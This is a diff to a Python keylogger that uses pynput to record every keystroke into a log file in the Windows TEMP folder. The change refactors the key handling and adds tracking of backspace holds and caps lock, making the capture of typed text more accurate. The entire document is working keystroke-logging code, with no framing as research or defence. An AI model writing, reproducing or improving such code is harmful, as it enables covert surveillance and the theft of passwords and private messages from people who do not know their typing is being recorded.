@@ -5,72 +5,62 @@ from pynput.keyboard import Key, Listener
 temp_path = os.path.join(os.environ["TEMP"])
 log_file = os.path.join(temp_path, "log.txt")
 
-# Get the system temp folder dynamically
-#temp_path = os.path.join(os.environ["TEMP"], "new")
+pressed_keys = set()  # Track currently pressed keys
+backspace_held = False  # Track if Backspace is held
 
-# Ensure the 'new' directory exists
-#os.makedirs(temp_path, exist_ok=True)
 
-# Set the log file path
-#log_file = os.path.join(temp_path, "log.txt")
+def write_to_file(key, backspace_on_press=False):
+    key = str(key).replace("'", "")
 
-def write_to_file(key):
-    key = str(key).replace("'", "")  
+    special_keys = {
+        'Key.space': " ",
+        'Key.enter': "[ENTER]\n",
+        'Key.tab': "\t",
+        'Key.caps_lock': "[CAPSLOCK]",
+        '<96>': "0", '<97>': "1", '<98>': "2", '<99>': "3",
+        '<100>': "4", '<101>': "5", '<102>': "6", '<103>': "7",
+        '<104>': "8", '<105>': "9"
+    }
+
     with open(log_file, "a") as f:
-        if key == 'Key.space':
-            f.write(" ")
-        elif key == 'Key.enter':
-            f.write("[ENTER]")
-        elif key == 'Key.backspace':
-            f.write("")
-        elif key == 'Key.tab':
-            f.write("\t")
-        elif key == 'Key.ctrl_l':
-            f.write("")
-        elif key == 'Key.shift':
-            f.write("")
-        elif key == 'Key.shift_r':
-            f.write("")
-        elif key == 'Key.ctrl_r':
-            f.write("")
-        elif key == 'Key.left':
-            f.write("")
-        elif key == 'Key.up':
-            f.write("")
-        elif key == 'Key.down':
-            f.write("")
-        elif key == 'Key.right':
-            f.write("")
-        elif key == 'Key.ctrl':
-            f.write("")
-
-
-        elif key == '<96>':
-            f.write("0")
-        elif key == '<97>':
-            f.write("1")
-        elif key == '<98>':
-            f.write("2")
-        elif key == '<99>':
-            f.write("3")
-        elif key == '<100>':
-            f.write("4")
-        elif key == '<101>':
-            f.write("5")
-        elif key == '<102>':
-            f.write("6")
-        elif key == '<103>':
-            f.write("7")
-        elif key == '<104>':
-            f.write("8")
-        elif key == '<105>':
-            f.write("9")
-
-        else:
+        if key == 'Key.backspace':
+            if backspace_on_press:
+                f.write("[BACKonPRESS]")
+            else:
+                f.write("[BACKSPACE]")
+        elif key in special_keys:
+            f.write(special_keys[key])
+        elif "Key." not in key:  # Ignore other special keys like shift, ctrl, arrows
             f.write(key)
 
-def on_press(key):
-    write_to_file(key)
 
-with Listener(on_press=on_press) as listener:
+def on_press(key):
+    global backspace_held
+
+    if key == Key.backspace:
+        if key in pressed_keys:  # Key is being held down
+            if not backspace_held:
+                write_to_file(key, backspace_on_press=True)
+                backspace_held = True  # Mark that [BACKonPRESS] was written
+        else:  # Normal press
+            write_to_file(key, backspace_on_press=False)
+    elif key == Key.caps_lock:  # Log Caps Lock press
+        write_to_file(key)
+    elif key not in pressed_keys:  # Only log other keys if first press
+        write_to_file(key)
+
+    pressed_keys.add(key)  # Mark key as pressed
+
+
+def on_release(key):
+    global backspace_held
+
+    if key in pressed_keys:
+        pressed_keys.remove(key)
+
+    if key == Key.backspace:
+        backspace_held = False  # Reset when Backspace is released
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
